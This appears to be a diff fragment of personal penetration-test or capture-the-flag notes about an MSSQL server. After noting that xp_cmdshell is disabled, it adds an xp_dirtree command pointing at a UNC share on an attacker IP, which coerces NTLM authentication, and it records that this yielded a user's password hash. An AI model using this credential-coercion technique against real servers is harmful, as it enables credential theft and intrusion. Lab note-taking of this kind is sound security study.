@@ -224,5 +224,9 @@ Nothing really in the current DB
 
 XP_cmdshell is disabled and i cannot enabled it
 
+```python
+exec master.dbo.xp_dirtree '\\10.10.14.61\any\thing'
+```
 
+Also coercing auth back to me got me a hash for the user
 
